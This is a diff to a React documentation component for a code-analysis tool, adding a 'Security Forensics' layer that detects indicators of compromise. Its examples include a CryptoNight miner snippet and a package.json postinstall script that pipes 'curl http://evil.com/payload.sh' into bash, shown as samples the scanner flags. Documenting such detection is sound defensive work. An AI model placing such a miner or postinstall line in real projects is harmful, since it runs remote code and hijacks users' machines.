@@ -1,5 +1,5 @@
 import React, { useState } from 'react';
-import { Settings, Layers, Sparkles, Target, ChevronDown, ChevronUp, Wrench, Code, Shield, Zap, Rocket, TestTube, Brain } from 'lucide-react';
+import { Settings, Layers, Sparkles, Target, ChevronDown, ChevronUp, Wrench, Code, Shield, Zap, Rocket, TestTube, Brain, ShieldAlert } from 'lucide-react';
 import { InstallCTA } from './InstallCTA';
 
 interface LayerDetail {
@@ -495,6 +495,62 @@ const Button = () => (
     ],
     whenToUse: "Run last after all other layers. Most effective after running multiple fixes to learn project-specific patterns.",
     technicalDetails: "Implements RuleStore class for pattern persistence. Uses confidence scoring (0-1.0) and frequency tracking. Extracts patterns by comparing before/after code from previous layers. Applies rules with minimum 0.7 confidence threshold."
+  },
+  {
+    id: 8,
+    name: "Layer 8: Security Forensics",
+    shortName: "L8 Security",
+    icon: <ShieldAlert className="w-6 h-6" />,
+    description: "Post-exploitation detection and security forensics for compromised codebases. Scans for Indicators of Compromise (IoCs), malicious patterns, and supply chain attacks.",
+    whatItDoes: [
+      "Detects 70+ Indicators of Compromise (IoC) signatures",
+      "Scans for crypto miners, reverse shells, and data exfiltration",
+      "Identifies malicious package.json scripts (postinstall attacks)",
+      "Finds hardcoded credentials and API keys",
+      "Detects supply chain attack patterns",
+      "Creates integrity baselines for drift detection",
+      "Generates SARIF 2.1.0 reports for GitHub Security integration",
+      "Provides incident response timeline reconstruction"
+    ],
+    keyFeatures: [
+      "READ-ONLY by default - never modifies code during scans",
+      "4 scan modes: quick, standard, deep, paranoid",
+      "SARIF 2.1.0 compliant for GitHub Security tab",
+      "CI/CD integration with --fail-on threshold",
+      "Timeline reconstruction via git history analysis",
+      "Multiple reporters: CLI, JSON, SARIF, HTML"
+    ],
+    examples: [
+      {
+        title: "Detecting Crypto Mining Code",
+        before: `// Hidden in minified bundle
+const miner = new CryptoNight.Miner('site-key');
+miner.start(CryptoNight.FORCE);`,
+        after: `// NeuroLint Security Alert:
+// CRITICAL: Crypto miner detected (CryptoNight)
+// File: dist/bundle.min.js:4523
+// Severity: CRITICAL
+// Action: Investigate immediately - code may be compromised`,
+        explanation: "Layer 8 detects crypto mining code patterns, even when hidden in minified bundles. Reports findings without modifying the suspicious code."
+      },
+      {
+        title: "Malicious Package Script Detection",
+        before: `{
+  "name": "trusted-package",
+  "scripts": {
+    "postinstall": "curl http://evil.com/payload.sh | bash"
+  }
+}`,
+        after: `// NeuroLint Security Alert:
+// CRITICAL: Malicious postinstall script detected
+// Pattern: Shell command execution via curl pipe
+// Risk: Supply chain attack - arbitrary code execution
+// Action: Remove package, audit dependencies`,
+        explanation: "Detects supply chain attack patterns in package.json scripts that execute remote payloads during npm install."
+      }
+    ],
+    whenToUse: "Run when you suspect compromise, after a security incident, or as part of regular security audits. Essential for CI/CD security gates.",
+    technicalDetails: "Uses pattern matching with 70 IoC signatures across 10 categories: crypto miners, reverse shells, data exfiltration, obfuscation, credential theft, supply chain attacks, webshells, backdoors, persistence mechanisms, and reconnaissance. Outputs SARIF 2.1.0 format for integration with GitHub Advanced Security, Azure DevOps, and other SAST tools."
   }
 ];
 
@@ -524,7 +580,7 @@ export function LayersDocSection() {
             Explore Each Layer in Detail
           </h2>
           <p className="text-xl md:text-2xl text-gray-300 max-w-4xl mx-auto font-medium mb-6">
-            Deep dive into NeuroLint's 7-layer architecture. Each layer targets specific issues with surgical precision.
+            Deep dive into NeuroLint's 8-layer architecture. Each layer targets specific issues with surgical precision.
           </p>
           <p className="text-lg text-gray-300 max-w-3xl mx-auto leading-relaxed">
             Each layer builds upon the previous, ensuring foundational issues are resolved first. Run individually or together based on your needs.
